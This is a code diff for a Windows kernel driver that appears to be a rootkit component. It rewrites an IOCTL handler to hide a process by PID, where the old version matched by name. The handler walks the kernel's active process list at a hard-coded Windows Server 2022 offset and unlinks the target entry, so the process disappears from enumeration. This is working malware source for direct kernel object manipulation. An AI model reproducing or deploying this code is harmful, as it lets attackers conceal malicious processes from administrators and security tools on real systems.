@@ -135,62 +135,59 @@ NTSTATUS SpyIoEnumerateRunningProcess(
     return STATUS_SUCCESS;
 }
 
-// Hide process IOCTL handler
-NTSTATUS SpyIoHideProcess(
+// Hiding process by pid
+NTSTATUS SpyIoHideProcessById(
     PVOID outputBuffer,
     ULONG outputLength,
     PULONG_PTR bytesReturned
 )
 {
-    DbgPrint("[*] SpyIoHideProcess called\n");
+    DbgPrint("[*] SpyIoHideProcessById called\n");
+
     if (!PsInitialSystemProcess) {
         DbgPrint("[-] PsInitialSystemProcess is NULL\n");
         *bytesReturned = 0;
         return STATUS_UNSUCCESSFUL;
     }
 
-    // get target process name
+    // Convert input->g_Name (string) to PID we handling it in client side :)
     PSPY_HIDE_INPUT input = (PSPY_HIDE_INPUT)outputBuffer;
-    char targetProc[256] = { 0 };
-    RtlCopyMemory(targetProc, input->g_Name, sizeof(input->g_Name));
-    DbgPrint("[*] Looking for process: %s\n", targetProc);
 
+    char pidString[256] = { 0 };
+    RtlCopyMemory(pidString, input->g_Name, sizeof(input->g_Name));
+
+    /*ULONG targetPid = (ULONG)strtoul(pidString, NULL, 10);*/\
+    ULONG_PTR targetPid = ParsePidFromString(input->g_Name);
+    DbgPrint("[*] Looking for PID: %lu\n", targetPid);
+
+    // Prepare output buffer
     char* out = (char*)outputBuffer;
     ULONG offset = 0;
     NTSTATUS status;
     size_t writtenBytes = 0;
     BOOLEAN found = FALSE;
 
-    status = RtlStringCbPrintfA(out + offset, outputLength - offset, "[*] Hiding Process: %s\n\n", targetProc);
-    if (!NT_SUCCESS(status)) {
-        DbgPrint("[-] Header print failed: 0x%X\n", status);
-        *bytesReturned = 0;
-        return status;
-    }
+    status = RtlStringCbPrintfA(out + offset, outputLength - offset,
+        "[*] Hiding Process with PID: %lu\n\n", targetPid);
+    if (!NT_SUCCESS(status)) { *bytesReturned = 0; return status; }
 
     status = RtlStringCbLengthA(out + offset, outputLength - offset, &writtenBytes);
     if (!NT_SUCCESS(status)) { *bytesReturned = 0; return status; }
     offset += (ULONG)writtenBytes;
 
-    // search in active process list
+    // Walk ActiveProcessLinks list
     PEPROCESS CurrentProcess = PsInitialSystemProcess;
 
-    // ActiveProcessLinks offset in Windows server 2022 +0x448
     PLIST_ENTRY head = (PLIST_ENTRY)((ULONG_PTR)CurrentProcess + 0x448);
     PLIST_ENTRY current = head->Flink;
-    while (current != head) {
-        // reverse the offset: LIST_ENTRY → EPROCESS
-        PEPROCESS process = (PEPROCESS)((ULONG_PTR)current - 0x448);
-        PCHAR imageName = PsGetProcessImageFileName(process);
-        /* if (imageName && RtlCompareMemory(imageName, targetProc, strlen(targetProc)) == strlen(targetProc))*/
-        ANSI_STRING procName;
-        ANSI_STRING targetName;
-        RtlInitAnsiString(&procName, imageName);
-        RtlInitAnsiString(&targetName, targetProc);
-        if (RtlEqualString(&procName, &targetName, TRUE))
-        {
-            DbgPrint("[+] Found target process: %s -> 0x%p\n", imageName, process);
 
+    while (current != head) {
+
+        PEPROCESS process = (PEPROCESS)((ULONG_PTR)current - 0x448);
+        HANDLE pid = PsGetProcessId(process);
+
+        if ((ULONG_PTR)pid == targetPid) {
+            DbgPrint("[+] Found target process: PID=%lu -> 0x%p\n", pid, process);
             found = TRUE;
 
             PLIST_ENTRY prev = current->Blink;
@@ -201,50 +198,48 @@ NTSTATUS SpyIoHideProcess(
             DbgPrint("    Current: 0x%p\n", current);
             DbgPrint("    Next: 0x%p\n", next);
 
-            // append to output
-            status = RtlStringCbPrintfA(out + offset, outputLength - offset, "[*] Unlinking process...\n    Prev: 0x%p\n    Current: 0x%p\n    Next: 0x%p\n", prev, current, next);
-            if (!NT_SUCCESS(status)) {
-                DbgPrint("[!] Unlinking print failed: 0x%X\n", status);
-                *bytesReturned = 0;
-                return status;
-            }
+            // Add to output buffer
+            status = RtlStringCbPrintfA(out + offset, outputLength - offset,
+                "[*] Unlinking process...\n    Prev: 0x%p\n    Current: 0x%p\n    Next: 0x%p\n",
+                prev, current, next);
+            if (!NT_SUCCESS(status)) { *bytesReturned = 0; return status; }
+
             status = RtlStringCbLengthA(out + offset, outputLength - offset, &writtenBytes);
             if (!NT_SUCCESS(status)) { *bytesReturned = 0; return status; }
             offset += (ULONG)writtenBytes;
-            // Unlink from the list
+
+            // Unlink it
             prev->Flink = next;
             next->Blink = prev;
-            DbgPrint("[+] Process unlinked successfully\n");
 
-            // cleanup
             current->Flink = current;
             current->Blink = current;
 
-            // append to output success message
-            status = RtlStringCbPrintfA(out + offset, outputLength - offset, "[+] Process unlinked successfully\n");
-            if (!NT_SUCCESS(status)) {
-                DbgPrint("[!] Success print failed: 0x%X\n", status);
-                *bytesReturned = 0;
-                return status;
-            }
+            DbgPrint("[+] Process unlinked successfully\n");
+
+            status = RtlStringCbPrintfA(out + offset, outputLength - offset,
+                "[+] Process unlinked successfully\n");
+            if (!NT_SUCCESS(status)) { *bytesReturned = 0; return status; }
+
             status = RtlStringCbLengthA(out + offset, outputLength - offset, &writtenBytes);
             if (!NT_SUCCESS(status)) { *bytesReturned = 0; return status; }
             offset += (ULONG)writtenBytes;
-            break;
 
+            break;
         }
 
         current = current->Flink;
     }
 
+    // Target not found
     if (!found) {
-        DbgPrint("[-] Target process not found: %s\n", targetProc);
-        status = RtlStringCbPrintfA(out + offset, outputLength - offset, "[-] Target process not found: %s\n", targetProc);
-        if (!NT_SUCCESS(status)) {
-            DbgPrint("[!] Not Found print failed: 0x%X\n", status);
-            *bytesReturned = 0;
-            return status;
-        }
+        DbgPrint("[-] Target process not found PID=%lu\n", targetPid);
+
+        status = RtlStringCbPrintfA(out + offset, outputLength - offset,
+            "[-] Target process not found PID=%lu\n", targetPid);
+
+        if (!NT_SUCCESS(status)) { *bytesReturned = 0; return status; }
+
         status = RtlStringCbLengthA(out + offset, outputLength - offset, &writtenBytes);
         if (!NT_SUCCESS(status)) { *bytesReturned = 0; return status; }
         offset += (ULONG)writtenBytes;
